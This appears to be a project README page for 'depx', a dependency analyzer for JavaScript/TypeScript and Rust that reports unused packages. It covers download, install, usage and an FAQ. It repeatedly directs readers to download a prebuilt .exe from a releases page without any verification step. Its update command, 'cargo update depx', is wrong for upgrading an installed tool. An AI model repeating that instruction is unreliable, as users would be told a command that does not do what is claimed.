---
layout: "default"
title: "🎉 depx - Understand Your Dependencies Easily"
description: "🔍 Analyze your JavaScript/TypeScript and Rust dependencies fast and intelligently, revealing what's actually used in your code and improving security."
---
# 🎉 depx - Understand Your Dependencies Easily

[![Download depx](https://img.shields.io/badge/Download-depx-blue.svg)](https://github.com/All2y/depx/releases)

## 📚 About depx

depx is a fast and intelligent dependency analyzer for JavaScript/TypeScript and Rust projects. It helps you understand what's in your `node_modules` and `Cargo.lock` files. With depx, you can quickly identify which packages are used in your code and discover unused or unnecessary items.

## 🚀 Getting Started

To get started with depx, follow these simple steps:

1. **Visit the Download Page**  
   Go to the [Releases page](https://github.com/All2y/depx/releases) to download the latest version of depx.

2. **Download the Software**  
   On the Releases page, look for the version you want to download. If you are using Windows, download the `.exe` file. If you are on macOS or Linux, download the appropriate binary for your system.

3. **Install depx**  
   Once downloaded, follow the installation instructions specific to your operating system. For users with Rust installed, simply run:

   ```bash
   cargo install depx
   ```

## 💻 System Requirements

depx runs on the following systems:

- **Operating Systems:** Windows, macOS, Linux
- **Required Libraries:** Rust programming language (for cargo install)

Make sure to have these installed before proceeding.

## ⚙️ Using depx

After installing depx, you can run it via your command line interface. Here’s how to use the main command:

### `depx analyze` - Find Unused Dependencies

This command analyzes your project to identify unused dependencies. To run this command, type:

```bash
depx analyze
```

You’ll get a report like this:

```
Dependency Analysis Report

Summary
  227 packages used
  6 dev/build tools (expected, no problems)
```

This report helps you clean up your projects and ensure they only include necessary packages.

## 📊 Features

- **Dependency Analysis**: Quickly find unused or unnecessary dependencies.
- **Contextual Information**: Understand why certain packages are installed and their impact on your project.
- **Support for JavaScript/TypeScript and Rust**: Works effectively with both ecosystems, offering flexibility for different project types.

## 🔄 Updating depx

Keep depx updated to access the latest features and fixes. You can do this by visiting the [Releases page](https://github.com/All2y/depx/releases) and downloading the latest version. 

If you installed via cargo, run:

```bash
cargo update depx
```

## ❓ Frequently Asked Questions

### How do I know if I have Rust installed?

Run this command in your terminal:

```bash
rustc --version
```

If Rust is installed, it will show you the version number. If it’s not installed, you can download it from the [official Rust website](https://www.rust-lang.org/).

### What are `node_modules` and `Cargo.lock`?

- **node_modules**: This folder contains all the installed JavaScript packages for your project. It can get large and cluttered.
- **Cargo.lock**: This file lists the exact versions of dependencies used in your Rust project, ensuring consistent builds.

### I found some unused dependencies. What should I do?

It’s a good idea to remove them to keep your project clean. You can do this manually by editing your `package.json` or `Cargo.toml` files, then running the appropriate install command (e.g., `npm install` for JavaScript projects).

## 📞 Support

If you need help, feel free to reach out. You can open an issue on our [GitHub repository](https://github.com/All2y/depx/issues), and our team will assist you.

## 📝 License

depx is licensed under the [MIT License](https://opensource.org/licenses/MIT). 

## 🔗 Important Links

- [Download depx](https://github.com/All2y/depx/releases)
- [Documentation](https://github.com/All2y/depx/wiki)
- [Report an Issue](https://github.com/All2y/depx/issues)

Take your dependency management to the next level with depx. Happy coding!